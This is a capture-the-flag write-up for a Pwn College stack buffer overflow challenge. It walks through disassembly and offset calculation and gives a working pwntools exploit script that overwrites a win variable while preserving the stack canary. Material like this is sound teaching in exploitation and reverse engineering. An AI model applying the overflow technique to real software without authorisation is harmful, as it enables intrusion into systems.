---
layout: post
title: First Overflow Hard
date: 2026-05-31 22:41 -0400
published: true
categories: ["Binary Exploitation","Pwn College"]
tags: ["Buffer Overflow", "Static analysis","Canary Bypass"]
toc: true
---
# WriteUp — First Overflow (Hard)

## Challenge

**Source**: PwnCollege — Binary Exploitation track
**Binary**: `binary-exploitation-first-overflow`
**Objective**: Overflow a stack buffer to set `win_variable != 0` and trigger `win()` — same vulnerability as the easy version, but **no debug output**. All information must be recovered via static analysis or a debugger.

## Differences from easy version

| Aspect                         | Easy                                      | Hard                                                                 |
| ------------------------------ | ----------------------------------------- | -------------------------------------------------------------------- |
| Buffer size                    | `char input[18]`                          | `char input[82]`                                                     |
| Debug output                   | Full stack dump, offset leak, canary leak | **None** — only "Send your payload" prompt                           |
| Source provided                | Yes                                       | Yes (only for this hard challenge; future ones won't include source) |
| Bin padding nops               | 276                                       | 3929                                                                 |
| Global vars for stack analysis | Present                                   | Removed                                                              |

## Binary properties (checksec)

| Mitigation   | Status                      |
| ------------ | --------------------------- |
| Arch         | amd64-64-little             |
| RELRO        | Full RELRO                  |
| Stack Canary | **Enabled** (must preserve) |
| NX           | Enabled                     |
| PIE          | **Disabled** (0x400000)     |
| Stripped     | No                          |

## Reverse engineering the offset

Since there's no debug output, we must extract the `input` → `win_variable` offset from the binary itself.

### Step 1: Disassemble `challenge()`

```
$ objdump -d binary-exploitation-first-overflow
```

Key instructions:

```asm
4022e9: sub    $0x90,%rsp             ; 144 bytes of stack space
4022fe: mov    %fs:0x28,%rax           ; load canary
402307: mov    %rax,-0x8(%rbp)         ; canary @ rbp-0x8
40230d: lea    -0x60(%rbp),%rdx        ; struct/data start @ rbp-0x60
40231e: rep stos %rax,%es:(%rdi)       ; zero-init 11 qwords (88 bytes)
40232f: movq   $0x1000,-0x68(%rbp)     ; size = 4096
40234d: lea    -0x60(%rbp),%rax        ; input buffer = rbp-0x60
402359: call   read@plt               ; read(0, input, 4096)
402393: mov    -0xc(%rbp),%eax         ; win_variable @ rbp-0xc
402396: test   %eax,%eax               ; check if zero
402398: je     4023a4                  ; skip if zero
40239f: call   4021da <win>           ; call win() if non-zero
```

### Step 2: Calculate offset

```
input        @ rbp - 0x60 = rbp - 96
win_variable @ rbp - 0x0c = rbp - 12
────────────────────────────────────
offset = 96 - 12 = 84 bytes
```

### Step 3: Verify struct size

`rep stos %rax,%es:(%rdi)` with `ecx = 0xb` (11) writes 11 × 8 = **88 bytes** of zeros. This matches:
- `input[82]` (82 bytes) + 2 bytes padding + `int win_variable` (4 bytes) = 88 bytes

### Memory layout

```
rbp-0x60 ─────── input[0..81]      82 bytes
rbp-0x0c ─────── win_variable       4 bytes  (int, aligned to 4)
rbp-0x08 ─────── stack canary        8 bytes  (from fs:0x28)
rbp-0x00 ─────── saved rbp
```

## Exploit strategy

**Goal**: Write a non-zero value to `win_variable` at offset 84 from the buffer start, without corrupting the canary at offset 88.

**Payload** (88 bytes total):

```
[84 bytes padding] [p32(0x1)]
                   └─ win_variable = 1
```

## Exploit script

```python
#!/usr/bin/env python3
from pwn import *
import os

context.arch = 'amd64'
context.log_level = 'info'

BIN = '/challenge/binary-exploitation-first-overflow' if os.path.exists(
    '/challenge/binary-exploitation-first-overflow'
) else './binary-exploitation-first-overflow'

elf = ELF(BIN)
p = process(elf.path)

# Offset reverse-engineered from challenge() disassembly:
#   input @ rbp-0x60, win_variable @ rbp-0xc => offset = 84
offset_to_win = 84

pay  = b'A' * offset_to_win
pay += p32(0x1)

p.sendafter(b'Send your payload', pay)
output = p.recvall(timeout=2)
print(output.decode(errors='replace'))
```

## Evidence


### Remote execution (PwnCollege)

```
$ ssh PwnCollege 'cd ~/Binary-Exploitation/First-Overflow-Hard && python3 exploit.py'
You win! Here is your flag:
pwn.college{x-x.x}
Goodbye!
```

Exit code: **0** — canary preserved, clean return.

## Key takeaways

1. **No debug output = need disassembly/debugger** — unlike the easy version which leaked offsets, here we had to read the assembly to find where `win_variable` lived (`rbp-0xc`) relative to the input buffer (`rbp-0x60`).
2. **`rep stos` initialization is a clue** — the compiler zero-inits the struct with a counted `rep stosq`; the count (11 qwords = 88 bytes) tells you the total struct size even without source.
3. **Canary preservation still matters** — payload of exactly 88 bytes = stops right at the canary. Clean exit (exit code 0) confirms no stack smash.
4. **Static analysis workflow**: `checksec` → `objdump -d` → find `read` call to locate buffer → find `test/cmp` before `win` call to locate target variable → subtract offsets.
